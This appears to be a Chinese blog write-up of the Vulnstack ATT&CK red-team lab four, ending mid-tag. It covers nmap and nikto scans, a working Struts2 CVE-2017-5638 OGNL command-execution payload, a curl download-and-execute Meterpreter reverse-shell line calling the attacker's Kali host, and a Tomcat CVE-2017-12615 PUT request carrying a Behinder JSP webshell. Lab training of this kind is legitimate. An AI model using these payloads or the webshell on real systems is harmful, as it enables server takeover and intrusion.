{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(四)","contentHtml":"<h1>ATT&#x26;CK红队评估实战靶场(四)</h1>\n<blockquote>\n<p>靶机链接：<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>\n</blockquote>\n<h2>环境搭建</h2>\n<p>新建两张仅主机网卡，一张<code>192.168.183.0</code>网段（内网网卡），一张1<code>92.168.157.0</code>网段（模拟外网网段），然后按照拓补图分配网卡即可</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image50.png\" alt=\"image.png\"></p>\n<p>IP信息：</p>\n<p>Kali <code>192.158.157.129</code></p>\n<p>Ubuntu-web <code>192.168.157.128</code> <code>192.168.183.129</code></p>\n<p>Win7 <code>192.168.183.131</code></p>\n<p>DC <code>192.168.183.130</code></p>\n<p>然后在ubuntu启动Docker，启动 <code>sudo docker start ec 17 09 bb da 3d ab ad</code></p>\n<h2>主机探测端口扫描</h2>\n<ol>\n<li>\n<p>扫描网段内存活主机</p>\n<pre><code class=\"hljs language-python\">nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">44</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:03 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:B6:<span class=\"hljs-number\">47</span>:4A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.254</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:E7:E8:3F (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.129</span>\nHost <span class=\"hljs-keyword\">is</span> up.\nNmap done: <span class=\"hljs-number\">256</span> IP addresses (<span class=\"hljs-number\">4</span> hosts up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">28.01</span> seconds\n</code></pre>\n<p>靶机IP是<code>128</code> ，<code>kali</code> 的IP是<code>129</code></p>\n</li>\n<li>\n<p>扫描靶机端口</p>\n<pre><code class=\"hljs language-python\">nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:04 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00076</span>s latency).\nNot shown: <span class=\"hljs-number\">65531</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">2001</span>/tcp <span class=\"hljs-built_in\">open</span>  dc\n<span class=\"hljs-number\">2002</span>/tcp <span class=\"hljs-built_in\">open</span>  globe\n<span class=\"hljs-number\">2003</span>/tcp <span class=\"hljs-built_in\">open</span>  finger\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:B6:<span class=\"hljs-number\">47</span>:4A (VMware)\n</code></pre>\n<p><code>2001</code>-<code>2003</code>是<code>web</code>端口</p>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-python\">nmap -sV -sT -O -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">2001</span>,<span class=\"hljs-number\">2002</span>,<span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">28</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00075</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">6.6</span><span class=\"hljs-number\">.1</span>p1 Ubuntu 2ubuntu2<span class=\"hljs-number\">.13</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">2001</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Jetty <span class=\"hljs-number\">9.2</span><span class=\"hljs-number\">.11</span>.v20150529\n<span class=\"hljs-number\">2002</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache Tomcat <span class=\"hljs-number\">8.5</span><span class=\"hljs-number\">.19</span>\n<span class=\"hljs-number\">2003</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.25</span> ((Debian))\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:B6:<span class=\"hljs-number\">47</span>:4A (VMware)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">3.</span>X|<span class=\"hljs-number\">4.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne\n</code></pre>\n<p><code>Jetty 9.2.11</code> 以及<code>Tomcat</code> 和 <code>httpd</code></p>\n</li>\n<li>\n<p>扫描主机服务漏洞，使用<code>nikto</code>扫描</p>\n<pre><code class=\"hljs language-python\">nikto -host <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span> -port <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">2001</span>,<span class=\"hljs-number\">2002</span>,<span class=\"hljs-number\">2003</span>                                                                                                                                 \n- Nikto v2<span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.0</span>                                                                                                                                                                          \n---------------------------------------------------------------------------                                                                                                             \n---------------------------------------------------------------------------                                                                                                             \n+ Target IP:          <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>                                                                                                                                                   \n+ Target Hostname:    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>                                                                                                                                                   \n+ Target Port:        <span class=\"hljs-number\">2001</span>                                                                                                                                                              \n+ Start Time:         <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">23</span> (GMT8)                                                                                                                                        \n---------------------------------------------------------------------------                                                                                                             \n+ Server: Jetty(<span class=\"hljs-number\">9.2</span><span class=\"hljs-number\">.11</span>.v20150529)                                                                                                                                                       \n+ /: Cookie JSESSIONID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies                                                                \n+ /: The anti-clickjacking X-Frame-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options                                        \n+ /: The X-Content-<span class=\"hljs-type\">Type</span>-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>. This could allow the user agent to render the content of the site <span class=\"hljs-keyword\">in</span> a different fashion to the MIME <span class=\"hljs-built_in\">type</span>. See: https://www.netsparke\nr.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class=\"hljs-built_in\">type</span>-header/                \n+ No CGI Directories found (use <span class=\"hljs-string\">'-C all'</span> to force check <span class=\"hljs-built_in\">all</span> possible dirs)                                                                                                              \n+ Jetty/<span class=\"hljs-number\">9.2</span><span class=\"hljs-number\">.11</span>.v20150529 appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least <span class=\"hljs-number\">11.0</span><span class=\"hljs-number\">.6</span>). Jetty <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.6</span> AND <span class=\"hljs-number\">9.4</span><span class=\"hljs-number\">.41</span>.v20210516 are also currently supported.                                           \n+ /: Uncommon header <span class=\"hljs-string\">'nikto-added-cve-2017-5638'</span> found, <span class=\"hljs-keyword\">with</span> contents: <span class=\"hljs-number\">42.</span>                                                                                                              \n+ /: Site appears vulnerable to the <span class=\"hljs-string\">'strutshock'</span> vulnerability. See: http://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2017</span>-<span class=\"hljs-number\">5638</span>\n+ /index.action: Site appears vulnerable to the <span class=\"hljs-string\">'strutshock'</span> vulnerability. See: http://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2017</span>-<span class=\"hljs-number\">5638</span>\n+ /login.action: Site appears vulnerable to the <span class=\"hljs-string\">'strutshock'</span> vulnerability. See: http://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2017</span>-<span class=\"hljs-number\">5638</span>                                            \n+ /getaccess: This may be an indication that the server <span class=\"hljs-keyword\">is</span> running getAccess <span class=\"hljs-keyword\">for</span> SSO.                                                                                                   + /siteminder: This may be an indication that the server <span class=\"hljs-keyword\">is</span> running Siteminder <span class=\"hljs-keyword\">for</span> SSO.                                                                                                 \n+ /tree: WASD Server reveals the entire web root structure <span class=\"hljs-keyword\">and</span> files via this URL. Upgrade to a later version <span class=\"hljs-keyword\">and</span> secure according to the documents on the WASD web site.               \n+ ERROR: Error limit (<span class=\"hljs-number\">20</span>) reached <span class=\"hljs-keyword\">for</span> host, giving up. Last error:                                                                                                                      \n+ Scan terminated: <span class=\"hljs-number\">0</span> error(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">11</span> item(s) reported on remote host                                                                                                                    \n+ End Time:           <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">37</span> (GMT8) (<span class=\"hljs-number\">14</span> seconds)                                                                                                                           \n---------------------------------------------------------------------------                                                                                                             \n+ Target IP:          <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>                                                       \n+ Target Hostname:    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>                                                                                                                                                   \n+ Target Port:        <span class=\"hljs-number\">2002</span>                                                                                                                                                              \n+ Start Time:         <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">37</span> (GMT8)                                                                                                                                        \n---------------------------------------------------------------------------                                                                                                             \n+ Server: No banner retrieved                                                               \n+ /: The anti-clickjacking X-Frame-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-<span class=\"hljs-type\">Type</span>-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>. This could allow the user agent to render the content of the site <span class=\"hljs-keyword\">in</span> a different fashion to the MIME <span class=\"hljs-built_in\">type</span>. See: https://www.netsparke\nr.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class=\"hljs-built_in\">type</span>-header/\n+ No CGI Directories found (use <span class=\"hljs-string\">'-C all'</span> to force check <span class=\"hljs-built_in\">all</span> possible dirs)                                                                                                              \n+ /favicon.ico: identifies this app/server <span class=\"hljs-keyword\">as</span>: Apache Tomcat (possibly <span class=\"hljs-number\">5.5</span><span class=\"hljs-number\">.26</span> through <span class=\"hljs-number\">8.0</span><span class=\"hljs-number\">.15</span>), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon\n+ /nikto-test-7haKDeBL.html: HTTP method <span class=\"hljs-string\">'PUT'</span> allows clients to save files on the web server. See: https://portswigger.net/kb/issues/<span class=\"hljs-number\">00</span>100900_http-put-method-<span class=\"hljs-keyword\">is</span>-enabled\n+ /favicon.ico: identifies this app/server <span class=\"hljs-keyword\">as</span>: Apache Tomcat (possibly <span class=\"hljs-number\">5.5</span><span class=\"hljs-number\">.26</span> through <span class=\"hljs-number\">8.0</span><span class=\"hljs-number\">.15</span>), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon                    [<span class=\"hljs-number\">0</span>/<span class=\"hljs-number\">122</span>]\n+ /nikto-test-7haKDeBL.html: HTTP method <span class=\"hljs-string\">'PUT'</span> allows clients to save files on the web server. See: https://portswigger.net/kb/issues/<span class=\"hljs-number\">00</span>100900_http-put-method-<span class=\"hljs-keyword\">is</span>-enabled               \n+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .                                                                                                                \n+ HTTP method (<span class=\"hljs-string\">'Allow'</span> Header): <span class=\"hljs-string\">'PUT'</span> method could allow clients to save files on the web server.                                                                                       \n+ HTTP method (<span class=\"hljs-string\">'Allow'</span> Header): <span class=\"hljs-string\">'DELETE'</span> may allow clients to remove files on the web server.                                                                                           \n+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.                                                                                                               \n+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2004</span>-<span class=\"hljs-number\">2104</span>                      \n+ /manager/manager-howto.html: Tomcat documentation found. See: CWE-<span class=\"hljs-number\">552</span>                                                                                                                 \n+ /manager/html: Default Tomcat Manager / Host Manager interface found.                                                                                                                 \n+ /host-manager/html: Default Tomcat Manager / Host Manager interface found.                                                                                                            \n+ /manager/status: Default Tomcat Server Status interface found.                                                                                                                        \n+ /host-manager/status: Default Tomcat Server Status interface found.                                                                                                                   \n+ <span class=\"hljs-number\">9610</span> requests: <span class=\"hljs-number\">0</span> error(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">14</span> item(s) reported on remote host                                                                                                                      \n+ End Time:           <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">21</span> (GMT8) (<span class=\"hljs-number\">44</span> seconds)                                                                                                                           \n---------------------------------------------------------------------------                                                                                                             \n+ Target IP:          <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>                                                                                                                                                   \n+ Target Hostname:    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.157</span><span class=\"hljs-number\">.128</span>                                                       \n+ Target Port:        <span class=\"hljs-number\">2003</span>                                                                                                                                                              \n+ Start Time:         <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">21</span> (GMT8)                                                                                                                                        \n---------------------------------------------------------------------------                                                                                                             \n+ Server: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.25</span> (Debian)                                                                                                                                                        \n+ /: Retrieved x-powered-by header: PHP/<span class=\"hljs-number\">7.2</span><span class=\"hljs-number\">.5</span>.                                                                                                                                          \n+ /: Uncommon header <span class=\"hljs-string\">'x-ob_mode'</span> found, <span class=\"hljs-keyword\">with</span> contents: <span class=\"hljs-number\">1.</span>                                                                                                                               \n+ /TrzGOLfn.show_query_columns: The X-Content-<span class=\"hljs-type\">Type</span>-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>. This could allow the user agent to render the content of the site <span class=\"hljs-keyword\">in</span> a different fashion to the MIME <span class=\"hljs-built_in\">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class=\"hljs-built_in\">type</span>-header/                                                                                 \n+ No CGI Directories found (use <span class=\"hljs-string\">'-C all'</span> to force check <span class=\"hljs-built_in\">all</span> possible dirs)                                                                                                              \n+ Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.25</span> appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.54</span>). Apache <span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.34</span> <span class=\"hljs-keyword\">is</span> the EOL <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">2.</span>x branch.                                                                \n+ Multiple index files found: /index.php, /index.jsp.                                                                                                                                   \n+ /: Web Server returns a valid response <span class=\"hljs-keyword\">with</span> junk HTTP methods which may cause false positives.                                                                                        \n+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-<span class=\"hljs-keyword\">for</span>-aspnet-applications?view=vs-<span class=\"hljs-number\">2017</span>    \n+ /README: README file found.                                                               \n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/                                                                     \n+ /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/                                                                      \n+ /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/                                                                      \n+ /package.json: Node.js package file found. It may contain sensitive information.                                                                                                      \n+ <span class=\"hljs-number\">17689</span> requests: <span class=\"hljs-number\">0</span> error(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">12</span> item(s) reported on remote host                         \n+ End Time:           <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">12</span>-02 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">18</span> (GMT8) (<span class=\"hljs-number\">57</span> seconds)                                                                                                                           \n---------------------------------------------------------------------------                                                                                                             \n+ <span class=\"hljs-number\">3</span> host(s) tested                                    \n</code></pre>\n<p><code>2001</code>端口可能存在<code>CVE-2017-5638</code> ，<code>2002</code> 端口允许<code>put</code>和<code>delete</code>方法（可能存在<code>CVE-2017-12615</code>）</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>访问主页\n<ul>\n<li>\n<p><code>2001</code>端口</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image51.png\" alt=\"image.png\"></p>\n<p>文件上传页面</p>\n</li>\n<li>\n<p><code>2002</code>端口</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image52.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p><code>2003</code>端口</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image53.png\" alt=\"image.png\"></p>\n<p>竟然是<code>phpmyadmin</code></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3>CVE-2017-5638</h3>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/moyudaxia/p/14445883.html\">https://www.cnblogs.com/moyudaxia/p/14445883.html</a></p>\n</blockquote>\n<p>发现和靶机页面一模一样，应该是使用直接<code>Docker</code>造的</p>\n<ul>\n<li>\n<p>验证漏洞</p>\n<pre><code class=\"hljs language-c\">Content-Type: %{<span class=\"hljs-meta\">#context[<span class=\"hljs-string\">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>].addHeader(<span class=\"hljs-string\">'vulhub'</span>,233*233)}.multipart/form-data</span>\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image54.png\" alt=\"image.png\"></p>\n<p>漏洞存在</p>\n</li>\n<li>\n<p>EXP，存在命令执行</p>\n<pre><code class=\"hljs language-c\">Content-Type: <span class=\"hljs-string\">\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='RCE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"</span>\n</code></pre>\n</li>\n</ul>\n<ol>\n<li>进行反弹<code>shell</code>\n<ul>\n<li>\n<p><code>msfvenom</code>生成<code>payload</code></p>\n<pre><code class=\"hljs language-c\">msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp lhost=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.129</span> lport=<span class=\"hljs-number\">1234</span> -f raw                                                                         \n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: cmd from the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">117</span> bytes\ncurl -so /tmp/irZWQXXBy http:<span class=\"hljs-comment\">//192.168.157.129:8080/gYBZzJWIpFJeIY1gYugNpQ; chmod +x /tmp/irZWQXXBy; /tmp/irZWQXXBy &#x26;</span>\n</code></pre>\n</li>\n<li>\n<p><code>msf</code>监听</p>\n<pre><code class=\"hljs language-c\">msf6 > use exploit/multi/handler                                                                 \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> payload cmd/linux/http/x64/meterpreter/reverse_tcp             \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> lhost 192.168.157.129                                                                                                                                 \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> lport 1234                                                     \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run                                                                                                                                                       \n</code></pre>\n</li>\n<li>\n<p><code>exp</code>中填入生成的<code>payload</code>，然后发送</p>\n<pre><code class=\"hljs language-c\">Content-Type: <span class=\"hljs-string\">\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl -so /tmp/irZWQXXBy http://192.168.157.129:8080/gYBZzJWIpFJeIY1gYugNpQ; chmod +x /tmp/irZWQXXBy; /tmp/irZWQXXBy &#x26;').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"</span>\n</code></pre>\n</li>\n<li>\n<p>获得shell</p>\n<pre><code class=\"hljs language-c\">msf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run                                                                                                                                                       \n                                                                                                 \n[*] Started reverse TCP handler on 192.168.157.129:1234                              \n[*] Sending <span class=\"hljs-title function_\">stage</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">3045380</span> bytes)</span> to 192.168.157.128                                             \n[*] Meterpreter session 1 <span class=\"hljs-title function_\">opened</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.129</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.128</span>:<span class=\"hljs-number\">52614</span>)</span> at 2024-12-02 14:52:14 +0800                                                                           \n                                                                                                                                                                                        \nmeterpreter >                                                                                                 \n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h3>CVE-2017-12615</h3>\n<p><code>Tomcat PUT</code>方法任意写文件漏洞，利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限</p>\n<ol>\n<li>\n<p>抓包然后修改为<code>PUT</code>方法，然后<code>1.jsp</code>是上传文件名，内容块里边是冰蝎的<code>JSP</code>脚本内容</p>\n<pre><code class=\"hljs language-c\">PUT /<span class=\"hljs-number\">1.</span>jsp/ HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.128</span>:<span class=\"hljs-number\">2002</span>\nUser-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">133.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">133.0</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*<span class=\"hljs-comment\">/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.157.128:2001/\nSec-GPC: 1\nConnection: keep-alive\nCookie: JSESSIONID=ebkm5umq7o4emfo8amiifu8q; phpMyAdmin=0e02d819225d61988d3e5e0979e5bf09; pma_lang=zh_CN\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\n&#x3C;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%>&#x3C;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>&#x3C;%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n</span></code></pre>\n</li>\n<li>\n<p>使用冰蝎连接，成功连接，获得<code>shell</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image55.png\" 